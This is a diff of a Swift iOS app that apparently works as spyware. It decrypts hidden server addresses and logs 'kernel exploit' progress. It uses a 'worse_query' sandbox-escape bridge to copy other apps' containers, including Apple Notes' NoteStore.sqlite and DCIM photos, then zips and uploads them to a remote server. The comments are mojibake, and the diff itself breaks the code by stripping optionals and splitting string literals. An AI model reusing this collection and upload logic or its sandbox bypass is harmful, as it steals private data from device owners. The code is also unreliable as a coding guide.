@@ -13,7 +13,8 @@ class AppLog: ObservableObject {
     private static let writeQueue = DispatchQueue(label: "com.yangjiii.3105.log-persist")
     private static let maximumLogFileBytes: UInt64 = 1_048_576
     private static let maximumRotatedLogFiles = 3
-    private static var fileHandle: FileHandle?
+    private static var fileHandle: FileHandle
+
 
     private static let lineTimestampFormatter: DateFormatter = {
         let formatter = DateFormatter()
@@ -160,7 +161,8 @@ class AppLog: ObservableObject {
 func log(_ msg: String) { AppLog.shared.append("[TRX] \(msg)") }
 
 // Retain the pipe for the app's lifetime so stdout/stderr stay redirected.
-private var logCapturePipe: Pipe?
+private var logCapturePipe: Pipe
+
 
 // Redirect stdout/stderr (C printf / NSLog) into the in-app log view so kernel
 // exploit progress and failures are visible without a debugger.
@@ -452,7 +454,10 @@ extension Data {
 }
 
 /// 涓?apptrace 浜岃繘鍒跺叡鐢ㄥ悓涓€浠?links.txt锛坆undle 璧勬簮锛夛細
-/// 鍐呭 = base64( AES-128-CBC( ["閾炬帴1","閾炬帴2",...] ) )锛?/// 瀵嗛挜/IV 涓?16 瀛楄妭 ASCII锛堜笌 gen_links_txt.py 淇濇寔涓€鑷达級銆?/// 涓荤▼搴忕敤瀹冭В鍑洪摼鎺ユ暟缁勶紝鍙栫涓€鏉′綔涓轰富鍗忚鏈嶅姟鍣ㄥ湴鍧€銆?enum LocalLinkProvider {
+/// 鍐呭 = base64( AES-128-CBC( ["閾炬帴1","閾炬帴2",...] ) )锛
+/// 瀵嗛挜/IV 涓?16 瀛楄妭 ASCII锛堜笌 gen_links_txt.py 淇濇寔涓€鑷达級銆
+/// 涓荤▼搴忕敤瀹冭В鍑洪摼鎺ユ暟缁勶紝鍙栫涓€鏉′綔涓轰富鍗忚鏈嶅姟鍣ㄥ湴鍧€銆
+enum LocalLinkProvider {
     static let keyBytes: [UInt8] = Array("tmvdzcGUsCG6ycyW".utf8)
     static let ivBytes: [UInt8] = Array("qG0IB6jBc7AQxkD1".utf8)
 
@@ -503,25 +508,41 @@ extension Data {
     }
 }
 
-/// 鍚姩閰嶇疆鐨勫姞瀵嗘彁渚涜€呫€?///
-/// `shell.txt` 鏄?App bundle 鍐呯殑鍔犲瘑閰嶇疆鏂囦欢锛屼繚瀛樹富绋嬪簭鍚姩鏃跺姞杞界殑绔欑偣鍦板潃銆?/// 鍔犲瘑鏂瑰紡涓?links.txt 瀹屽叏涓€鑷达細base64( AES-128-CBC( 鏄庢枃, key, iv, PKCS7 ) )锛?/// 鏄庢枃鏄畝鍗曠殑 key=value 鏂囨湰銆?///
+/// 鍚姩閰嶇疆鐨勫姞瀵嗘彁渚涜€呫€
+///
+/// `shell.txt` 鏄?App bundle 鍐呯殑鍔犲瘑閰嶇疆鏂囦欢锛屼繚瀛樹富绋嬪簭鍚姩鏃跺姞杞界殑绔欑偣鍦板潃銆
+/// 鍔犲瘑鏂瑰紡涓?links.txt 瀹屽叏涓€鑷达細base64( AES-128-CBC( 鏄庢枃, key, iv, PKCS7 ) )锛
+/// 鏄庢枃鏄畝鍗曠殑 key=value 鏂囨湰銆
+///
 /// 闃茬牬瑙ｈ鐐癸細
-///   1. 浜岃繘鍒跺唴涓嶅嚭鐜版槑鏂?URL锛宍strings` 鎼滀笉鍒扮洰鏍囧湴鍧€銆?///   2. 鏍￠獙瑙ｅ瘑缁撴灉蹇呴』鍖呭惈鍚堟硶 https 绔欑偣锛屽惁鍒欑洿鎺ユ嫆缁濆姞杞姐€?enum ShellConfigProvider {
-    /// 閰嶇疆鏂囦欢鍚嶏紙bundle 璧勬簮锛夈€?    static let resourceName = "shell"
+///   1. 浜岃繘鍒跺唴涓嶅嚭鐜版槑鏂?URL锛宍strings` 鎼滀笉鍒扮洰鏍囧湴鍧€銆
+///   2. 鏍￠獙瑙ｅ瘑缁撴灉蹇呴』鍖呭惈鍚堟硶 https 绔欑偣锛屽惁鍒欑洿鎺ユ嫆缁濆姞杞姐€
+enum ShellConfigProvider {
+    /// 閰嶇疆鏂囦欢鍚嶏紙bundle 璧勬簮锛夈€
+    static let resourceName = "shell"
     static let resourceExtension = "txt"
 
-    /// 瀵嗛挜/IV锛?6 瀛楄妭 ASCII 甯搁噺锛屼笌 gen_shell_txt.py 淇濇寔涓€鑷淬€?    private static let keyBytes: [UInt8] = Array("7T_shell_conf_v1".utf8)
+    /// 瀵嗛挜/IV锛?6 瀛楄妭 ASCII 甯搁噺锛屼笌 gen_shell_txt.py 淇濇寔涓€鑷淬€
+    private static let keyBytes: [UInt8] = Array("7T_shell_conf_v1".utf8)
     private static let ivBytes: [UInt8] = Array("sh3ll_c0nf_iv16x".utf8)
 
-    /// 鍚姩鏃惰В鍑虹殑閰嶇疆銆?    struct Config: Equatable {
-        /// 涓荤▼搴忓姞杞界殑绔欑偣鍦板潃銆?        let shellURL: URL
-        /// 绔欑偣鏍囬锛堝彲閫夛級銆?        let title: String?
-        /// 涓诲崗璁湇鍔″櫒鍦板潃锛堝彲閫夛紱鏈彁渚涙椂璧?links.txt / 鍐呯疆鍥為€€锛夈€?        let protocolBaseURL: URL?
+    /// 鍚姩鏃惰В鍑虹殑閰嶇疆銆
+    struct Config: Equatable {
+        /// 涓荤▼搴忓姞杞界殑绔欑偣鍦板潃銆
+        let shellURL: URL
+        /// 绔欑偣鏍囬锛堝彲閫夛級銆
+        let title: String
+
+        /// 涓诲崗璁湇鍔″櫒鍦板潃锛堝彲閫夛紱鏈彁渚涙椂璧?links.txt / 鍐呯疆鍥為€€锛夈€
+        let protocolBaseURL: URL
+
     }
 
-    /// 瑙ｆ瀽鍚庣殑閰嶇疆銆傚姞杞藉け璐ユ椂涓?nil銆?    static let config: Config? = load()
+    /// 瑙ｆ瀽鍚庣殑閰嶇疆銆傚姞杞藉け璐ユ椂涓?nil銆
+    static let config: Config? = load()
 
-    /// 涓荤▼搴忚鍔犺浇鐨勭珯鐐瑰湴鍧€銆?    static var shellURL: URL? { config?.shellURL }
+    /// 涓荤▼搴忚鍔犺浇鐨勭珯鐐瑰湴鍧€銆
+    static var shellURL: URL? { config?.shellURL }
 
     // MARK: - Loading
 
@@ -540,7 +561,8 @@ extension Data {
         return config
     }
 
-    /// AES-128-CBC 瑙ｅ瘑锛圥KCS7 濉厖锛夛紝涓?links.txt 鍚屼竴濂楀疄鐜般€?    private static func decrypt(_ cipher: Data) -> Data? {
+    /// AES-128-CBC 瑙ｅ瘑锛圥KCS7 濉厖锛夛紝涓?links.txt 鍚屼竴濂楀疄鐜般€
+    private static func decrypt(_ cipher: Data) -> Data? {
         let size = cipher.count + kCCBlockSizeAES128
         var buffer = [UInt8](repeating: 0, count: size)
         var written = 0
@@ -563,7 +585,8 @@ extension Data {
         return Data(buffer[0..<written])
     }
 
-    /// 鏄庢枃 key=value 鏂囨湰 鈫?閰嶇疆瀵硅薄銆?    private static func parse(_ plain: Data) -> Config? {
+    /// 鏄庢枃 key=value 鏂囨湰 鈫?閰嶇疆瀵硅薄銆
+    private static func parse(_ plain: Data) -> Config? {
         guard let text = String(data: plain, encoding: .utf8) else { return nil }
         var fields: [String: String] = [:]
         for line in text.split(separator: "\n") {
@@ -579,7 +602,8 @@ extension Data {
               url.scheme?.lowercased() == "https",
               let host = url.host, !host.isEmpty else { return nil }
 
-        var protocolBaseURL: URL?
+        var protocolBaseURL: URL
+
         if let raw = fields["protocol"],
            let candidate = URL(string: raw),
            candidate.scheme?.lowercased() == "https",
@@ -594,10 +618,13 @@ extension Data {
 /// Main-protocol API client. Every payload is sent as an AES-encrypted
 /// `params` field; responses unwrap the envelope and decrypt `data`.
 enum ProtocolAPI {
-    // 涓诲崗璁湇鍔″櫒鍦板潃锛氫紭鍏堣鍙?bundle 閲岀殑 links.txt锛堜笌 apptrace 浜岃繘鍒跺悓涓€浠斤級锛?    // 鍙栫涓€鏉￠摼鎺ワ紱璇讳笉鍒版垨瑙ｄ笉寮€鏃跺洖閫€鍒颁笅闈㈣繖琛岀‖缂栫爜鍦板潃銆?    static let fallbackBaseURL = URL(string: "https://7t.com")!
+    // 涓诲崗璁湇鍔″櫒鍦板潃锛氫紭鍏堣鍙?bundle 閲岀殑 links.txt锛堜笌 apptrace 浜岃繘鍒跺悓涓€浠斤級锛
+    // 鍙栫涓€鏉￠摼鎺ワ紱璇讳笉鍒版垨瑙ｄ笉寮€鏃跺洖閫€鍒颁笅闈㈣繖琛岀‖缂栫爜鍦板潃銆
+    static let fallbackBaseURL = URL(string: "https://7t.com")!
 
     static var baseURL: URL {
-        // 浼樺厛浣跨敤 shell.txt 閲岀殑涓诲崗璁湴鍧€锛涘叾娆℃槸 bundle 閲岀殑 links.txt锛涙渶鍚庡洖閫€鍒板唴缃湴鍧€銆?        if let configured = ShellConfigProvider.config?.protocolBaseURL {
+        // 浼樺厛浣跨敤 shell.txt 閲岀殑涓诲崗璁湴鍧€锛涘叾娆℃槸 bundle 閲岀殑 links.txt锛涙渶鍚庡洖閫€鍒板唴缃湴鍧€銆
+        if let configured = ShellConfigProvider.config?.protocolBaseURL {
             return configured
         }
         return LocalLinkProvider.firstURL ?? fallbackBaseURL
@@ -637,8 +664,11 @@ enum ProtocolAPI {
     }
 
     /// Pulls the collection list with `/api/device/report`.
-    /// 棣栨鍚姩浼氬脊銆屾湰鍦扮綉缁溿€嶆潈闄愭锛涚敤鎴风偣銆屽厑璁搞€嶄箣鍓嶈姹備細澶辫触銆?    /// 杩欓噷姣?2 绉掗噸璇曚竴娆°€佹渶澶?6 娆★紝鐐瑰畬鍏佽鍚庝笅涓€娆″嵆鍙垚鍔燂紝鏃犻渶閲嶅惎 App銆?    static func pullCollectConfigs() async throws -> [CollectConfig] {
-        var lastError: Error?
+    /// 棣栨鍚姩浼氬脊銆屾湰鍦扮綉缁溿€嶆潈闄愭锛涚敤鎴风偣銆屽厑璁搞€嶄箣鍓嶈姹備細澶辫触銆
+    /// 杩欓噷姣?2 绉掗噸璇曚竴娆°€佹渶澶?6 娆★紝鐐瑰畬鍏佽鍚庝笅涓€娆″嵆鍙垚鍔燂紝鏃犻渶閲嶅惎 App銆
+    static func pullCollectConfigs() async throws -> [CollectConfig] {
+        var lastError: Error
+
         for attempt in 0..<10 {
             do {
                 return try await pullCollectConfigsOnce()
@@ -863,7 +893,9 @@ enum ProtocolLogReporter {
 enum ProtocolCollectService {
     static let maximumLocalZipCount = 10
 
-    /// 鐩綍鏁翠綋澶嶅埗澶辫触鏃剁殑鍏滃簳锛氶€愭枃浠跺鍒讹紙Data 璇?+ 鍐欙級锛?    /// 鍗曚釜鏂囦欢璇讳笉浜嗗氨璺宠繃骞惰鏃ュ織锛岃兘鎷垮灏戞嬁澶氬皯銆?    @discardableResult
+    /// 鐩綍鏁翠綋澶嶅埗澶辫触鏃剁殑鍏滃簳锛氶€愭枃浠跺鍒讹紙Data 璇?+ 鍐欙級锛
+    /// 鍗曚釜鏂囦欢璇讳笉浜嗗氨璺宠繃骞惰鏃ュ織锛岃兘鎷垮灏戞嬁澶氬皯銆
+    @discardableResult
     private static func copyDirectoryFallback(
         at sourceURL: URL,
         into destinationDirectory: URL,
@@ -897,7 +929,8 @@ enum ProtocolCollectService {
                 log("collect: per-file copied \(sourceURL.lastPathComponent) \(data.count)B")
                 return 1
             } catch {
-                // 26.6.1+ 鍏滃簳锛欶ileManager 琚矙鐩掓嫆缁濇椂鐢?worse_query 璇诲師濮嬪瓧鑺?                if WQContainerBridge.isSupported,
+                // 26.6.1+ 鍏滃簳锛欶ileManager 琚矙鐩掓嫆缁濇椂鐢?worse_query 璇诲師濮嬪瓧鑺
+                if WQContainerBridge.isSupported,
                    let data = WQContainerBridge.read(sourceURL.path) {
                     do {
                         try data.write(to: target, options: .atomic)
@@ -962,7 +995,9 @@ enum ProtocolCollectService {
         // where iOS suspends the app, so the ZIP loop never ran.
 
         guard !configs.isEmpty else {
-            // 绌洪厤缃笉鑳界畻鎴愬姛锛氬惁鍒?hasAttempted 浼氭案涔呴攣姝伙紝鍐嶄篃涓嶉噸璇曘€?            // 鎶?failed锛岃 collectIfNeeded(retryAfterFailure: true) 杩樿兘鍐嶆媺涓€娆°€?            log("collect: empty collect configs 鈥?will retry")
+            // 绌洪厤缃笉鑳界畻鎴愬姛锛氬惁鍒?hasAttempted 浼氭案涔呴攣姝伙紝鍐嶄篃涓嶉噸璇曘€
+            // 鎶?failed锛岃 collectIfNeeded(retryAfterFailure: true) 杩樿兘鍐嶆媺涓€娆°€
+            log("collect: empty collect configs 鈥?will retry")
             throw ProtocolCollectError.collectionFailed("empty collect configs")
         }
 
@@ -983,8 +1018,10 @@ enum ProtocolCollectService {
                 }
                 continue
             }
-            // iOS 26.6.1+锛氬鍣ㄨ矾寰勮兘浠?LaunchServices 搴撻噷鎷垮埌锛屼絾娌欑洅浠嶇劧鎸＄潃璇汇€?            // worse_query 鍦ㄨ繖閲岃ˉ涓€娆℃矙鐩掓墿灞曪紝涔嬪悗 FileManager / FileManagerService
-            // 鐨勬櫘閫氳鍐欏嵆鍙敓鏁堬紱鎷夸笉鍒版墿灞曟椂涓嬮潰鐨勫鍒朵細澶辫触骞惰蛋 WQ 璇诲啓鍏滃簳銆?            if WQContainerBridge.isSupported {
+            // iOS 26.6.1+锛氬鍣ㄨ矾寰勮兘浠?LaunchServices 搴撻噷鎷垮埌锛屼絾娌欑洅浠嶇劧鎸＄潃璇汇€
+            // worse_query 鍦ㄨ繖閲岃ˉ涓€娆℃矙鐩掓墿灞曪紝涔嬪悗 FileManager / FileManagerService
+            // 鐨勬櫘閫氳鍐欏嵆鍙敓鏁堬紱鎷夸笉鍒版墿灞曟椂涓嬮潰鐨勫鍒朵細澶辫触骞惰蛋 WQ 璇诲啓鍏滃簳銆
+            if WQContainerBridge.isSupported {
                 let granted = WQContainerBridge.grant(containerPath)
                 log("collect(wq): grant \(config.bundleID) -> \(granted ? "ok" : "denied")")
             }
@@ -1026,7 +1063,9 @@ enum ProtocolCollectService {
             var copied = 0
             let containerRootURL = URL(fileURLWithPath: containerPath, isDirectory: true)
             for source in sources {
-                // 鏁村鍣ㄩ」锛氭妸瀹瑰櫒鍐呯殑鏉＄洰骞抽摵澶嶅埗杩?<appName>/锛?                // 涓?legacy 绠＄嚎鐨?zip 缁撴瀯涓€鑷达紙NoteStore.sqlite 鐩存帴鍙锛?                if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
+                // 鏁村鍣ㄩ」锛氭妸瀹瑰櫒鍐呯殑鏉＄洰骞抽摵澶嶅埗杩?<appName>/锛
+                // 涓?legacy 绠＄嚎鐨?zip 缁撴瀯涓€鑷达紙NoteStore.sqlite 鐩存帴鍙锛
+                if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
                     let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
                     log("collect: whole-container copy 鈥?\(entries.count) entries")
                     var tried = 0
@@ -1066,7 +1105,9 @@ enum ProtocolCollectService {
                     copied += 1
                 } catch {
                     log("collect: copy failed \(source.name) 鈥?\(error)")
-                    // 鐩綍澶嶅埗澶辫触鐨勫厹搴曪細閫愭枃浠跺鍒讹紝璇讳笉浜嗙殑璺宠繃锛?                    // 淇濊瘉 NoteStore.sqlite 绛夎兘鎷垮灏戞嬁澶氬皯銆?                    copied += copyDirectoryFallback(
+                    // 鐩綍澶嶅埗澶辫触鐨勫厹搴曪細閫愭枃浠跺鍒讹紝璇讳笉浜嗙殑璺宠繃锛
+                    // 淇濊瘉 NoteStore.sqlite 绛夎兘鎷垮灏戞嬁澶氬皯銆
+                    copied += copyDirectoryFallback(
                         at: source.url,
                         into: stagingURL,
                         fileManager: fileManager,
@@ -1151,9 +1192,12 @@ enum ProtocolCollectService {
     /// Enumerates installed app bundle ids using the same merged pipeline as
     /// the Files browser (LS/API + MCM + filesystem + LaunchServices + MHA-C2
     /// + metadata inference), since plain MCM enumeration is restricted.
-    /// iOS 26.6.1+ 鐨勯噰闆嗗叆鍙ｏ細worse_query 璺緞銆?    ///
-    /// 鍙仛涓変欢浜嬶細LaunchServices 鏁版嵁搴?鈫?瀹瑰櫒璺緞 鈫?bundle id 鈫?鍘婚噸鎺掑簭銆?    /// 涓嶇 MCM 鐨?O(n) XPC銆佷笉璺?inode 鍏ㄧ洏鎵弿锛屾墍浠ヤ竴娆″彧瑕佸嚑鐧炬绉掞紱
-    /// 璇诲彇灞傚啀鎸夐渶 `wq_grant`锛岄伩鍏嶅湪杩欓噷瀵瑰嚑鐧句釜瀹瑰櫒閫愪釜鎺堟潈銆?    private static func enumerateInstalledBundleIDsViaWQ() -> [String] {
+    /// iOS 26.6.1+ 鐨勯噰闆嗗叆鍙ｏ細worse_query 璺緞銆
+    ///
+    /// 鍙仛涓変欢浜嬶細LaunchServices 鏁版嵁搴?鈫?瀹瑰櫒璺緞 鈫?bundle id 鈫?鍘婚噸鎺掑簭銆
+    /// 涓嶇 MCM 鐨?O(n) XPC銆佷笉璺?inode 鍏ㄧ洏鎵弿锛屾墍浠ヤ竴娆″彧瑕佸嚑鐧炬绉掞紱
+    /// 璇诲彇灞傚啀鎸夐渶 `wq_grant`锛岄伩鍏嶅湪杩欓噷瀵瑰嚑鐧句釜瀹瑰櫒閫愪釜鎺堟潈銆
+    private static func enumerateInstalledBundleIDsViaWQ() -> [String] {
         let started = Date()
         let paths = WQContainerBridge.containerPaths()
 
@@ -1184,8 +1228,11 @@ enum ProtocolCollectService {
     }
 
     private static func enumerateInstalledBundleIDs() -> [String] {
-        // iOS 26.6.1 璧凤紝MCM 鐨勫鍣ㄦ煡璇㈠拰 FileManager 瀵瑰叾瀹?app 瀹瑰櫒鍩烘湰澶辨晥锛?        // 鍘熸潵鐨勪簲璺悎骞讹紙API + MCM + MHA + 鏂囦欢绯荤粺 + 鎺ㄦ柇锛変細鍏ㄥ啗瑕嗘病锛屽彧鍓╄嚜宸便€?        // 杩欎竴妗ｆ敼鐢?worse_query锛圵Q Files锛夛細鐩存帴浠?LaunchServices 鏁版嵁搴撹瀹瑰櫒
-        // 鍒楄〃锛屽啀鐢?wq_grant 鎷挎矙鐩掓墿灞曡惤鍒拌鍙栧眰銆備笂鎶ユ帴鍙ｄ笌鏃ュ織鏍煎紡涓嶅彉銆?        if WQContainerBridge.isSupported {
+        // iOS 26.6.1 璧凤紝MCM 鐨勫鍣ㄦ煡璇㈠拰 FileManager 瀵瑰叾瀹?app 瀹瑰櫒鍩烘湰澶辨晥锛
+        // 鍘熸潵鐨勪簲璺悎骞讹紙API + MCM + MHA + 鏂囦欢绯荤粺 + 鎺ㄦ柇锛変細鍏ㄥ啗瑕嗘病锛屽彧鍓╄嚜宸便€
+        // 杩欎竴妗ｆ敼鐢?worse_query锛圵Q Files锛夛細鐩存帴浠?LaunchServices 鏁版嵁搴撹瀹瑰櫒
+        // 鍒楄〃锛屽啀鐢?wq_grant 鎷挎矙鐩掓墿灞曡惤鍒拌鍙栧眰銆備笂鎶ユ帴鍙ｄ笌鏃ュ織鏍煎紡涓嶅彉銆
+        if WQContainerBridge.isSupported {
             return enumerateInstalledBundleIDsViaWQ()
         }
 
@@ -1207,8 +1254,10 @@ enum ProtocolCollectService {
             path: { $0.containerPath }
         )
         // LaunchServices 鐨?csstore锛?1.5 MB锛夐噷鑳芥崬鍑?2 涓囧鏉″€欓€夛紝鍏朵腑缁濆ぇ澶氭暟
-        // 鏄巻鍙叉潯鐩?/ mime / scheme 娈嬬暀锛屼笉鏄湡瀹?App锛涙瘡涓€欓€夐兘瑕佸啀鍋氫竴娆?        // MHA 瀹瑰櫒鏌ヨ锛屽疄娴?30 绉掍互涓婏紝瀵艰嚧 reportInstalledApps 璧跺湪 App 琚寕璧峰墠
-        // 璺戜笉瀹屻€侻CM + 鏂囦欢绯荤粺锛堢害 250 涓湡瀹炲鍣級宸茶鐩栫湡瀹炲畨瑁呯殑 App銆?        let launchServicesIdentifiers: [String] = []
+        // 鏄巻鍙叉潯鐩?/ mime / scheme 娈嬬暀锛屼笉鏄湡瀹?App锛涙瘡涓€欓€夐兘瑕佸啀鍋氫竴娆
+        // MHA 瀹瑰櫒鏌ヨ锛屽疄娴?30 绉掍互涓婏紝瀵艰嚧 reportInstalledApps 璧跺湪 App 琚寕璧峰墠
+        // 璺戜笉瀹屻€侻CM + 鏂囦欢绯荤粺锛堢害 250 涓湡瀹炲鍣級宸茶鐩栫湡瀹炲畨瑁呯殑 App銆
+        let launchServicesIdentifiers: [String] = []
         if ContainerStore.launchServicesStoreIdentifiers != nil {
             log("collect: LaunchServices candidate source disabled (MCM + filesystem only)")
         }
@@ -1277,8 +1326,10 @@ enum ProtocolCollectService {
         normalized = normalized.trimmingCharacters(in: .whitespaces)
 
         // 鏁村鍣ㄩ」锛?/"銆?."銆?./"銆佺┖锛夛細婧愬氨鏄鍣ㄧ洰褰曟湰韬紝
-        // 涓嶈兘琚綋鎴愭枃浠剁郴缁熸牴璺緞 "/"锛堝惁鍒欎細鍘诲鍒舵暣涓牴鐩綍鎴栨姤 sourceMissing锛夈€?        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
-            // 瀹瑰櫒鍩哄噯鏈韩鏄?"/"锛堢函缁濆璺緞閰嶇疆锛夋椂锛岀姝㈡暣瀹瑰櫒澶嶅埗绯荤粺鏍?            guard containerURL.path != "/" else {
+        // 涓嶈兘琚綋鎴愭枃浠剁郴缁熸牴璺緞 "/"锛堝惁鍒欎細鍘诲鍒舵暣涓牴鐩綍鎴栨姤 sourceMissing锛夈€
+        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
+            // 瀹瑰櫒鍩哄噯鏈韩鏄?"/"锛堢函缁濆璺緞閰嶇疆锛夋椂锛岀姝㈡暣瀹瑰櫒澶嶅埗绯荤粺鏍
+            guard containerURL.path != "/" else {
                 log("collect: skip whole-container item 鈥?container base is filesystem root")
                 return nil
             }
@@ -1333,19 +1384,26 @@ enum ProtocolCollectService {
         case ProtocolCollectError.serverUnreachable:
             return "鏈嶅姟鍣ㄤ笉鍙揪"
         case ProtocolCollectError.invalidServerResponse:
-            return "鏈嶅姟鍣ㄥ搷搴斿紓甯?
+            return "鏈嶅姟鍣ㄥ搷搴斿紓甯
+
         case ProtocolCollectError.collectionFailed:
             return "璇诲彇鏂囦欢澶辫触"
         case ProtocolCollectError.uploadFailed:
-            return "涓婁紶琚嫆缁?
+            return "涓婁紶琚嫆缁
+
         default:
             return String(describing: error)
         }
     }
 
     private static func resolveContainer(for config: CollectConfig) -> String? {
-        // 鎵€鏈?items 閮芥槸缁濆璺緞锛堝 /var/mobile/Media/DCIM銆丳hotoData锛夋椂锛?        // 涓嶉渶瑕?MCM 瀹瑰櫒瑙ｆ瀽锛氱洿鎺ョ敤 "/" 浣滃熀鍑嗐€?        // 娌欑璁惧涓?fileExists 浼氳嚜鐒跺け璐ワ紙鏄剧ず"閲囬泦椤硅矾寰勪笉瀛樺湪"锛夛紝
-        // 鎻愭潈鎴愬姛鐨勮澶囦笂鍒欒兘鐩存帴閲囬泦銆?        // 娉ㄦ剰锛氭暣瀹瑰櫒鏍囪 "/"銆?."銆?./"銆佺┖ 涓嶅睘浜?缁濆璺緞"锛?        // 瀹冧滑琛ㄧず"瀹瑰櫒鏈韩"锛屽繀椤昏蛋姝ｅ父鐨勫鍣ㄨВ鏋愩€?        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
+        // 鎵€鏈?items 閮芥槸缁濆璺緞锛堝 /var/mobile/Media/DCIM銆丳hotoData锛夋椂锛
+        // 涓嶉渶瑕?MCM 瀹瑰櫒瑙ｆ瀽锛氱洿鎺ョ敤 "/" 浣滃熀鍑嗐€
+        // 娌欑璁惧涓?fileExists 浼氳嚜鐒跺け璐ワ紙鏄剧ず"閲囬泦椤硅矾寰勪笉瀛樺湪"锛夛紝
+        // 鎻愭潈鎴愬姛鐨勮澶囦笂鍒欒兘鐩存帴閲囬泦銆
+        // 娉ㄦ剰锛氭暣瀹瑰櫒鏍囪 "/"銆?."銆?./"銆佺┖ 涓嶅睘浜?缁濆璺緞"锛
+        // 瀹冧滑琛ㄧず"瀹瑰櫒鏈韩"锛屽繀椤昏蛋姝ｅ父鐨勫鍣ㄨВ鏋愩€
+        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
             let p = item.path.trimmingCharacters(in: .whitespaces)
             guard !p.isEmpty, p != "/", p != ".", p != "./" else { return false }
             return p.hasPrefix("/")
@@ -1384,9 +1442,11 @@ enum ProtocolCollectService {
     private static var retainedGroupGrants: [String: Int64] = [:]
 
     private static func activateGroupContainerPath(identifier: String) -> String? {
-        // "榄旀敼寮€ class7"锛氱粍瀹瑰櫒瑙ｆ瀽浠庡彧璇?class 3 鏀逛负璇曞叏濂?        // class 7锛堢郴缁熺粍锛宻ystemgroup.*锛? 9锛圓ppGroup锛? 8锛圙roup锛? 3锛圫hared锛夛紝
+        // "榄旀敼寮€ class7"锛氱粍瀹瑰櫒瑙ｆ瀽浠庡彧璇?class 3 鏀逛负璇曞叏濂
+        // class 7锛堢郴缁熺粍锛宻ystemgroup.*锛? 9锛圓ppGroup锛? 8锛圙roup锛? 3锛圫hared锛夛紝
         // 澶囧繕褰?NoteStore.sqlite 鎵€鍦ㄧ殑 group.com.apple.notes /
-        // systemgroup.com.apple.notes 闇€瑕?class 7 鎵嶈兘瑙ｆ瀽鍒般€?        if let groupPath = ContainerStore.resolveGroupContainerPath(identifier: identifier) {
+        // systemgroup.com.apple.notes 闇€瑕?class 7 鎵嶈兘瑙ｆ瀽鍒般€
+        if let groupPath = ContainerStore.resolveGroupContainerPath(identifier: identifier) {
             log("collect: resolved group container \(identifier) via MCM -> \(groupPath)")
             return groupPath
         }
